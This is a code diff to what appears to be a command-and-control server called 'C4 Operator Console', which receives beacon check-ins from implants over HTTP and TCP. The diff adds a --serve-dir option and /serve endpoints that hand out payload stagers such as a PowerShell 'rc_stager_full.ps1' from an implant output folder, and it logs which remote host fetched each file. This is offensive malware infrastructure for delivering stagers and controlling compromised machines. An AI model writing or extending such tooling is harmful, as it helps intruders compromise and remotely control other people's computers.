@@ -345,6 +345,41 @@ registry = BeaconRegistry()
 _app_ref: C4Console | None = None
 
 
+# ---------------------------------------------------------------------------
+# File serving (stager delivery)
+# ---------------------------------------------------------------------------
+
+_SERVE_DIR: Path | None = None  # set via --serve-dir
+
+
+async def handle_serve(request: web.Request) -> web.Response:
+    """Serve files from the stager output directory (e.g. GET /serve/rc_stager_full.ps1)."""
+    if _SERVE_DIR is None:
+        return web.Response(text="File serving not configured", status=503)
+
+    filename = request.match_info.get("filename", "")
+    # Prevent path traversal
+    safe_path = (_SERVE_DIR / filename).resolve()
+    if not str(safe_path).startswith(str(_SERVE_DIR.resolve())):
+        return web.Response(text="Forbidden", status=403)
+
+    if not safe_path.is_file():
+        return web.Response(text="Not found", status=404)
+
+    log.info("Serving file: %s → %s", request.remote, safe_path.name)
+    return web.FileResponse(safe_path)
+
+
+async def handle_serve_index(request: web.Request) -> web.Response:
+    """List available files in the serve directory."""
+    if _SERVE_DIR is None:
+        return web.Response(text="File serving not configured", status=503)
+    files = [f.name for f in _SERVE_DIR.iterdir() if f.is_file()]
+    return web.json_response({"files": sorted(files)})
+
+
+# ---------------------------------------------------------------------------
+
 async def handle_checkin(request: web.Request) -> web.Response:
     try:
         data = await request.json()
@@ -367,6 +402,8 @@ async def handle_checkin(request: web.Request) -> web.Response:
 async def start_http(port: int) -> web.AppRunner:
     app = web.Application()
     app.router.add_post("/beacon", handle_checkin)
+    app.router.add_get("/serve", handle_serve_index)
+    app.router.add_get("/serve/{filename:.+}", handle_serve)
     runner = web.AppRunner(app, access_log=None)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", port)
@@ -608,6 +645,8 @@ class C4Console(App):
         self._log("[bold cyan]C4 Operator Console[/] started")
         self._log(f"HTTP listener: [bold]0.0.0.0:{self.listen_port}[/]")
         self._log(f"TCP  listener: [bold]0.0.0.0:{self.tcp_port}[/] (stager beacons)")
+        if _SERVE_DIR:
+            self._log(f"File serving:  [bold]GET /serve/<file>[/] from {_SERVE_DIR}")
         self._log("Waiting for beacons...\n")
         self._log(
             "[dim]Commands: beacons, interact <name>, alias <id> <name>, back, quit, help[/]\n"
@@ -957,7 +996,20 @@ def main() -> None:
         action="store_true",
         help="Run browser sessions in headless mode",
     )
+    parser.add_argument(
+        "--serve-dir",
+        type=Path,
+        default=None,
+        help="Directory to serve files from (e.g. out/<implant-id>). Accessible at GET /serve/<filename>",
+    )
     args = parser.parse_args()
+
+    global _SERVE_DIR
+    if args.serve_dir:
+        _SERVE_DIR = Path(args.serve_dir).resolve()
+        if not _SERVE_DIR.is_dir():
+            print(f"[!] --serve-dir does not exist: {_SERVE_DIR}")
+            sys.exit(1)
 
     browser_bridge.headless = args.headless
 
